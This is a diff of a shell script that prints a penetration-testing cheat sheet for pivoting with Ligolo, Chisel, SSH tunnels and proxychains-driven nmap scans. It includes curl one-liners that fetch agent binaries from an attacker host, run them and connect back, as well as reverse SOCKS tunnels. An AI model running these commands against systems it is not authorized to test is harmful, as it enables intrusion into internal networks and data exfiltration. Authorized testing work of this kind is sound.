@@ -37,7 +37,7 @@ echo -e "LHOST=${GREEN}$LHOST${NC}"
 echo -e "TOOLS_PORT=${GREEN}$TOOLS_PORT${NC}"
 
 echo ""
-echo '********** Ligolo **********'
+echo '********** Ligolo 🚀**********'
 echo
 echo "# Starting the proxy"
 echo "./proxy -selfcert -laddr 0.0.0.0:9001"
@@ -53,7 +53,7 @@ echo
 echo "curl -L -o /tmp/agent http://$LHOST:$TOOLS_PORT/pivoting/ligolo/linux/agent && chmod +x /tmp/agent && /tmp/agent -connect $LHOST:9001 -ignore-cert"
 
 echo
-echo '********** Chisel **********'
+echo '********** Chisel ⛏️**********'
 echo
 echo "# Starting the server"
 echo "./chisel server --port 8888 --reverse"
@@ -69,13 +69,14 @@ echo
 echo "curl -L -o /tmp/chisel http://$LHOST:$TOOLS_PORT/pivoting/chisel/linux/chisel && chmod +x /tmp/chisel && /tmp/chisel client $LHOST:8888 R:1080:socks"
 
 echo
-echo '********** SSH **********'
+echo '********** SSH 🤓**********'
 echo
 echo "Local port to remote port"
 echo "ssh -f -N -L 127.0.0.1:8080:127.0.0.1:80 user@target"
 echo "ssh -f -N -L 8080:127.0.0.1:8080 user@target"
 echo
 echo "# Reverse Local Port to Remote Port"
+echo "# When we want to access something on our machine e.g tools/exfil"
 echo "ssh -R 31337:127.0.0.1:31337 user@target"
 echo
 echo "ssh -f -N -R $LHOST:8080:127.0.0.1:8888 user@target"
@@ -83,4 +84,11 @@ echo "ssh -f -N -R $LHOST:$TOOLS_PORT:127.0.0.1:$TOOLS_PORT user@target"
 echo
 echo "# Forward dynamic socks proxy" 
 echo "ssh -f -N -D 127.0.0.1:1080 user@target"
-echo
+echo 
+echo "# Using the dynamic proxy"
+echo "proxychains4 -f proxycahins.conf curl http://127.0.0.1:8080"
+echo 
+echo "Quick nmap scan of internal network"
+echo "proxychains4 -f proxychains.conf sudo nmap -PN -sV --top-ports 1000 --open 127.0.0.1"
+echo "proxychains4 -f proxychains.conf sudo nmap -PN -sV --top-ports 1000 --open 0.0.0.0"
+echo "proxychains4 -f proxychains.conf sudo nmap -PN -sV --top-ports 1000 --open 10.0.10.20"
